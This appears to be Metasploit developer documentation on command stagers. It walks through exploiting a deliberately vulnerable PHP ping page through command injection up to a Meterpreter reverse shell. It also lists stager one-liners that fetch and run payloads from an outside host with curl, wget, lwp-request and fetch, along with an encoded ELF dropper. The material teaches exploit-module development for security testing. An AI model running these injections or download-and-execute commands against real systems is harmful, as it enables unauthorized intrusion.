# The Vulnerability Test Case
The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:
```php
<?php
   if ( isset($_GET["ip"]) ) {
      $output = system("ping -c 1 " . $_GET["ip"]);
      die($output);
   }
?>

<html>
<body>
  <form action = "ping.php" method = "GET">
   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
  </form>
   </body>
</html>
```

you the output:
```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

OK, now we can abuse that a little and execute another command (id):
```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# The Msf::Exploit::CmdStager Mixin
Although there are many flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmd_stager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all command stagers:
```ruby
include Msf::Exploit::CmdStager
```

To tell `Msf::Exploit::CmdStager` what flavors you want, you can add the
```CmdStagerFlavor```

An example of setting flavors for a specific target:
```ruby
'Targets'   =>
  [
    [ 'Windows',
      {
        'Arch' => [ ARCH_X86_64, ARCH_X86 ],
        'Platform' => 'win',
        'CmdStagerFlavor' => [ 'certutil', 'vbs' ]
      }
    ]
  ]
```

Or, you can pass this info to the `execute_cmdstager` method (see Step 4 to begin).
```ruby
execute_cmdstager(flavor: :vbs)
```

You also must create a
```def execute_command(cmd, opts = {})```

method in your module. This is how you define how to execute a command on the target.  The parameter `cmd` is the command to execute.  When writing the
```execute_cmd```

method, remember that a great deal of work might already be done for you.  Here is an example of a web host that executes a command as part of a request:
```ruby
  def execute_command(cmd, _opts = {})
    populate_values if @sid.nil? || @token.nil?
    uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php'

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri),
      'cookie' => 'sid=' + @sid,
      'ctype' => 'application/x-www-form-urlencoded',
      'encode_params' => true,
      'vars_post' => {
        'token' => @token,
        'text' => cmd,
        'hhook' => 'exec',
        'sid' => @sid
      }
    })
  end
```

Here is an example targets section from a command injection module:
```ruby
    'Targets' => [
      [
        'Unix Command',
        {
          'Platform' => 'unix',
          'Arch' => ARCH_CMD,
          'Type' => :unix_cmd,
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp',
            'RPORT' => 9000
          }
        }
      ],
      [
        'Linux (Dropper)',
        {
          'Platform' => 'linux',
          'Arch' => [ARCH_X64],
          'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
          'Type' => :linux_dropper
        }
      ],

```

As we said earlier, the way a payload is executed depends on the payload type.  By including `Msf::Exploit::CmdStager` you are given access to a method called
```execute_cmdstager```

.
```execute_cmdstager```

makes a list of required commands to encode, upload, save, decode, and execute your payload, then uses the
```execute_command```

Unfortunately, we just mentioned not all payloads need to be saved to disk.  In the case of a payload that does not need to be saved to disk, we only need to call
```execute_command```

This problem of payload/method juggling sounds far worse than it is.  Below is a quick example of how simple the
```exploit```

method will become if you have properly defined your targets as discussed in step 3:
```ruby
  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
```

That’s it.  If the user selects an `ARCH_CMD` payload, we call the
```execute_command```

method on the payload because as we said earlier, these payloads will execute within a single command.  If the user has selected a
```dropped```

payload like `ARCH_X64` or `ARCH_X86`, then we call
```execute_cmdstager```

At the minimum, this is how your exploit should start when you're using the CmdStager mixin:
```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Command Injection Using CmdStager',
        'Description' => %q{
          This exploits a command injection using the command stager.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'sinn3r' ],
        'References' => [ [ 'URL', 'http://metasploit.com' ] ],
        'Platform' => 'linux',
        'Targets' => [ [ 'Linux', {} ] ],
        'Payload' => { 'BadChars' => "\x00" },
        'CmdStagerFlavor' => [ 'printf' ],
        'Privileged' => false,
        'DisclosureDate' => '2016-06-10',
        'DefaultTarget' => 0
      )
    )
  end

  def execute_command(cmd, opts = {})
    # calls some method to inject cmd to the vulnerable code.
  end

  def exploit
    print_status('Exploiting...')
    execute_cmdstager
  end

end
```

Now let's modify the `execute_command` method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:
```
127.0.0.1+%26%26+[Malicious commands]
```

We do that in `execute_command` using [[HttpClient|./How-to-Send-an-HTTP-Request-Using-HttpClient.md]]. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
```ruby
def filter_bad_chars(cmd)
  cmd.gsub!(/chmod \+x/, 'chmod 777')
  cmd.gsub!(/;/, ' %26%26 ')
  cmd.gsub!(/ /, '+')
end

def execute_command(cmd, _opts = {})
  send_request_cgi(
    {
      'method' => 'GET',
      'uri' => '/ping.php',
      'encode_params' => false,
      'vars_get' => {
        'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
      }
    }
  )
end

def exploit
  print_status('Exploiting...')
  execute_cmdstager
end
```

And let's run that, we should have a shell:
```msf
msf exploit(cmdstager_demo) > run

[*] Started reverse TCP handler on 10.6.0.92:4444
[*] Exploiting...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.6.0.92
[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
```

# Flavors
## VBS Command Stager - Windows Only
To use the VBS stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'vbs' ]
```

Or set the :vbs key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :vbs)
```

You will also need to make sure the module's supported platforms include windows (also in the metadata), example:
```ruby
'Platform' => 'win'
```

## Certutil Command Stager - Windows Only
[Certutil](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb) is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back up and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8.  I find the certutil flavor confusing, as certutil can be used to download files just like `wget` and `ftp`, we do not use it that way here; instead we use `echo` to write the file as a base64 encoded certificate, and then we use `certutil` to decode it prior to execution:
```bash
echo -----BEGIN CERTIFICATE----- > encoded.txt
echo Just Base64 encode your binary data
echo TVoAAA== >> encoded.txt
echo -----END CERTIFICATE----- >> encoded.txt
certutil -decode encoded.txt decoded.bin
```

To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'certutil' ]
```

Or set the :certutil key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :certutil)
```

You will also need to remember to set the platform in the metadata:
```ruby
'Platform' => 'win'
```

## Debug_write Command Stager - Windows Only
To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'debug_write' ]
```

Or set the :debug_write key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :debug_write)
```

You will also need to remember to set the platform in the metadata:
```ruby
'Platform' => 'win'
```

## Debug_asm Command Stager - Windows Only
To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'debug_asm' ]
```

Or set the :debug_asm key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :debug_asm)
```

You will also need to remember to set the platform in the metadata:
```ruby
'Platform' => 'win'
```

## TFTP Command Stager - Windows Only
The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root:
```
rvmsudo ./msfconsole
```

To use the TFTP stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'tftp' ]
```

Or set the :tftp key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :tftp)
```

You will also need to remember to set the platform in the metadata:
```ruby
'Platform' => 'win'
```

## PowerShell Invoke-WebRequest - Windows Only
To use the PowerShell Invoke-WebRequest stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'psh_invokewebrequest' ]
```

Or set the :psh_invokewebrequest key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :psh_invokewebrequest )
```

## Bourne Command Stager - Multi Platform
The [Bourne](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb) command stager supports multiple platforms except for Windows. Just like many other stagers, it writes a base64 encoded payload to disk, but then it tries to decode it using four different commands: base64, openssl, python, and perl.  This is very useful if the target's OS is unpredictable. You can see the way it attempts to use multiple decoding techniques by setting `verbose` to `true` and launching an exploit that has `bourne` as a supported command stager flavor and selecting it as the flavor:
```
[*] Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAA
AAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoK
QVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXAoFh8lRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+
Wg8FSIXAeO3/5g==>>'/tmp/XtMnQ.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (w
hich openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; pri
nt base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)
')) 2> /dev/null > '/tmp/IPUov' < '/tmp/XtMnQ.b64' ; chmod +x '/tmp/IPUov' ; '/tmp/IPUov' ; rm -f '/tmp/IPUov' ; rm -f '
/tmp/XtMnQ.b64'"]
```

To use the Bourne stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'bourne' ]
```

Or set the :bourne key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :bourne)
```

## Echo Command Stager - Multi Platform
The [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb) command stager is suitable for multiple platforms except for Windows. It just [echos](http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html) the payload, chmod and execute it. An example of that looks similar to this:
```bash
echo -en \\x41\\x41\\x41\\x41 >> /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
```

To use the echo stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'echo' ]
```

Or set the :echo key to execute_cmdstager:
```ruby
execute_cmdstager(flavor: :echo)
```

## Printf Command Stager - Multi Platform
The [printf](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb) command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:
```
printf '\177\177\177\177' >> /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
```

To use the printf stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'printf' ]
```

Or set the :printf key to `execute_cmdstager`:
```ruby
execute_cmdstager(flavor: :printf)
```

## cURL Command Stager - Multi Platform
The [cURL](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb) command stager uses the `curl` command on the target host to download the payload file. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
```bash
curl -so /tmp/dtNGlaaL http://10.5.135.201:8080/mdkwKcdGCtU;chmod +x /tmp/dtNGlaaL;/tmp/dtNGlaaL;rm -f /tmp/dtNGlaaL"
```

To use the cURL stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'curl' ]
```

Or set the :curl key to `execute_cmdstager`:
```ruby
execute_cmdstager(flavor: :curl)
```

## wget Command Stager - Multi Platform
The [wget](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb) command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the `wget` command. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
```bash
wget -qO /tmp/MZXxujch http://10.5.135.201:8080/mdkwKcdGCtU;chmod +x /tmp/MZXxujch;/tmp/MZXxujch;rm -f /tmp/MZXxujch
```

To use the wget stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'wget' ]
```

Or set the :wget key to `execute_cmdstager`:
```ruby
execute_cmdstager(flavor: :wget)
```

## LWP Request Command Stager - Multi Platform
The [lwp-request](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb) command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the `lwp-request` command. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
```bash
lwp-request -m GET http://10.5.135.201:8080/mdkwKcdGCtU > /tmp/OKOnDYwn;chmod +x /tmp/OKOnDYwn;/tmp/OKOnDYwn;rm -f /tmp/OKOnDYwn

```

To use the lwprequest stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'lwprequest' ]
```

Or set the :lwprequest key to `execute_cmdstager`:
```ruby
execute_cmdstager(flavor: :lwprequest)
```

## Fetch Command Stager - BSD Only
The [fetch](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb) command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the `fetch` command. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
```bash
fetch -qo /tmp/UGWuPPcy http://10.5.135.201:8080/mdkwKcdGCtU;chmod +x /tmp/UGWuPPcy;/tmp/UGWuPPcy;rm -f /tmp/UGWuPPcy
```

To use the fetch stager, either specify your CmdStagerFlavor in the metadata:
```ruby
'CmdStagerFlavor' => [ 'fetch' ]
```

Or set the :fetch key to `execute_cmdstager`:
```ruby
execute_cmdstager(flavor: :fetch)
```

